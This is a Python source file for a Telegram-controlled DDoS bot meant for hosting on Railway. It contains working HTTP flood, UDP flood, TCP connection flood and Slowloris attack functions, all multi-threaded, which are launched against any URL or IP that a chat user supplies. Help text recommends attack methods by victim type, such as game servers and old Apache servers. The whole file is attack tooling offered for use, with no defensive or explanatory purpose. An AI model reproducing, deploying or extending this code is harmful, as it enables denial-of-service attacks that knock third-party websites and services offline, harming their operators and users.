#!/usr/bin/env python3
# Telegram DDoS Bot - RAJPUT Railway Edition 🔥

import telebot
import requests
import threading
import time
import os
import sys
import random
import socket
import logging
from datetime import datetime
from flask import Flask, request
import cloudscraper

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
PORT = int(os.environ.get('PORT', 8080))

# ========== SETUP ==========
app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)
scraper = cloudscraper.create_scraper()
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

# Active attacks tracking
active_attacks = {}
attack_lock = threading.Lock()

# User agents for HTTP flood
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
]

# ========== ATTACK METHODS ==========
def http_flood(target, duration, method="GET"):
    """HTTP Flood with multiple threads"""
    end_time = time.time() + duration
    
    def flood_worker():
        while time.time() < end_time:
            try:
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Upgrade-Insecure-Requests': '1',
                }
                
                if method == "GET":
                    requests.get(target, headers=headers, timeout=5, verify=False)
                elif method == "POST":
                    requests.post(target, headers=headers, data={'data': random.randint(1,9999)}, timeout=5)
                elif method == "HEAD":
                    requests.head(target, headers=headers, timeout=5)
            except:
                pass
    
    # Start 100 threads for max power
    threads = []
    for _ in range(100):
        t = threading.Thread(target=flood_worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    return threads

def udp_flood(target_ip, target_port, duration):
    """UDP Flood attack"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(65507)
    
    def udp_worker():
        while time.time() < end_time:
            try:
                sock.sendto(bytes_data, (target_ip, target_port))
            except:
                pass
    
    threads = []
    for _ in range(50):
        t = threading.Thread(target=udp_worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    return threads

def tcp_flood(target_ip, target_port, duration):
    """TCP Connection Flood"""
    end_time = time.time() + duration
    
    def tcp_worker():
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target_ip, target_port))
                sock.send(random._urandom(1024))
                sock.close()
            except:
                pass
    
    threads = []
    for _ in range(50):
        t = threading.Thread(target=tcp_worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    return threads

def slowloris(target, duration):
    """Slowloris attack - keeps connections open"""
    end_time = time.time() + duration
    host = target.replace('http://', '').replace('https://', '').split('/')[0]
    port = 443 if 'https' in target else 80
    
    def slow_worker():
        sockets = []
        # Create 200 connections
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                s.send(f"Accept-language: en-US,en,q=0.9\r\n".encode())
                sockets.append(s)
            except:
                pass
        
        # Keep them alive
        while time.time() < end_time:
            for s in sockets[:]:
                try:
                    s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                except:
                    sockets.remove(s)
            time.sleep(10)
    
    t = threading.Thread(target=slow_worker)
    t.daemon = True
    t.start()
    return [t]

# ========== TELEGRAM COMMANDS ==========
@bot.message_handler(commands=['start'])
def start_cmd(message):
    welcome = """
╔══════════════════════════════════════╗
║    RAJPUT DDOS BOT - RAILWAY EDITION ║
╚══════════════════════════════════════╝

🔥 **AVAILABLE COMMANDS:**

🎯 `/attack_http <url> <time>` - HTTP Flood (Layer 7)
🎯 `/attack_udp <ip> <port> <time>` - UDP Flood (Layer 4)
🎯 `/attack_tcp <ip> <port> <time>` - TCP Flood (Layer 4)
🎯 `/slowloris <url> <time>` - Slowloris Attack
🛡️ `/methods` - Show all attack methods
📊 `/status` - Bot status
⏹️ `/stop` - Stop all attacks

⚡ **POWER LEVEL:** 8500/10000
⏱️ **MAX TIME:** 300 seconds
🚂 **HOSTED ON:** Railway.app

⚠️ **USE AT YOUR OWN RISK!**
    """
    bot.reply_to(message, welcome)

@bot.message_handler(commands=['methods'])
def methods_cmd(message):
    methods = """
🔥 **ATTACK METHODS EXPLAINED:**

**1. HTTP FLOOD** 🌐
   - Sends 100+ HTTP requests per second
   - Uses random user agents
   - Best for: Websites, Web servers

**2. UDP FLOOD** 📦
   - Sends large UDP packets
   - Max packet size: 65507 bytes
   - Best for: Game servers, VoIP

**3. TCP FLOOD** 🔌
   - Opens multiple TCP connections
   - 50 concurrent connections
   - Best for: Database servers, SSH

**4. SLOWLORIS** 🐌
   - Keeps 200+ connections open
   - Sends partial headers
   - Best for: Apache, IIS servers

**RECOMMENDATION:**
- HTTP Flood = General websites
- UDP Flood = Gaming servers
- TCP Flood = Network services
- Slowloris = Old web servers
    """
    bot.reply_to(message, methods)

@bot.message_handler(commands=['attack_http'])
def attack_http_cmd(message):
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "❌ Usage: /attack_http <url> <time>\nExample: /attack_http https://example.com 60")
            return
        
        target = parts[1]
        duration = min(int(parts[2]), 300)
        
        bot.reply_to(message, f"🚀 **HTTP Flood Started!**\n\n🎯 Target: {target}\n⏱️ Duration: {duration}s\n⚡ Threads: 100\n\nAttack in progress... 💀")
        
        http_flood(target, duration, "GET")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['attack_udp'])
def attack_udp_cmd(message):
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "❌ Usage: /attack_udp <ip> <port> <time>\nExample: /attack_udp 192.168.1.1 80 60")
            return
        
        target_ip = parts[1]
        target_port = int(parts[2])
        duration = min(int(parts[3]), 300)
        
        bot.reply_to(message, f"🚀 **UDP Flood Started!**\n\n🎯 Target: {target_ip}:{target_port}\n⏱️ Duration: {duration}s\n⚡ Packets: 50/sec\n\nAttack in progress... 💀")
        
        udp_flood(target_ip, target_port, duration)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['attack_tcp'])
def attack_tcp_cmd(message):
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "❌ Usage: /attack_tcp <ip> <port> <time>\nExample: /attack_tcp 192.168.1.1 22 60")
            return
        
        target_ip = parts[1]
        target_port = int(parts[2])
        duration = min(int(parts[3]), 300)
        
        bot.reply_to(message, f"🚀 **TCP Flood Started!**\n\n🎯 Target: {target_ip}:{target_port}\n⏱️ Duration: {duration}s\n🔌 Connections: 50\n\nAttack in progress... 💀")
        
        tcp_flood(target_ip, target_port, duration)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['slowloris'])
def slowloris_cmd(message):
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "❌ Usage: /slowloris <url> <time>\nExample: /slowloris https://example.com 60")
            return
        
        target = parts[1]
        duration = min(int(parts[2]), 300)
        
        bot.reply_to(message, f"🐌 **Slowloris Started!**\n\n🎯 Target: {target}\n⏱️ Duration: {duration}s\n🔗 Connections: 200\n\nAttack in progress... 💀")
        
        slowloris(target, duration)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    status = f"""
📊 **BOT STATUS:**

✅ Bot: **ONLINE**
🚂 Platform: **Railway**
⚡ Power Level: **8500/10000**
⏱️ Uptime: **24/7**
🎯 Active Attacks: {len(active_attacks)}
👤 Users: **Active**

**READY TO ATTACK!** 💀
    """
    bot.reply_to(message, status)

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    bot.reply_to(message, "🛑 Stopping all attacks... Bot will restart in 5 seconds! 💀")
    time.sleep(2)
    os._exit(0)

# ========== FLASK WEBHOOK ==========
@app.route('/')
def home():
    return "🤖 RAJPUT DDOS Bot is running on Railway! Use Telegram to control."

@app.route('/health')
def health():
    return {"status": "ok", "timestamp": datetime.now().isoformat()}

@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    return 'Invalid request', 403

# ========== MAIN ==========
def main():
    logger.info("🤖 Starting RAJPUT DDOS Bot on Railway...")
    
    if BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE' or not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set! Please add it in Railway Variables.")
        return
    
    is_railway = 'RAILWAY_STATIC_URL' in os.environ
    
    if is_railway:
        railway_url = f"https://{os.environ.get('RAILWAY_STATIC_URL')}"
        webhook_url = f"{railway_url}/{BOT_TOKEN}"
        
        logger.info(f"🚂 Railway detected! URL: {railway_url}")
        logger.info(f"🔗 Setting webhook to: {webhook_url}")
        
        bot.remove_webhook()
        time.sleep(1)
        bot.set_webhook(url=webhook_url)
        
        logger.info(f"✅ Webhook set successfully!")
        logger.info(f"🚀 Bot running on port {PORT}")
        
        app.run(host='0.0.0.0', port=PORT)
    else:
        logger.info("💻 Local mode detected! Starting polling...")
        bot.infinity_polling()

if __name__ == '__main__':
    main()
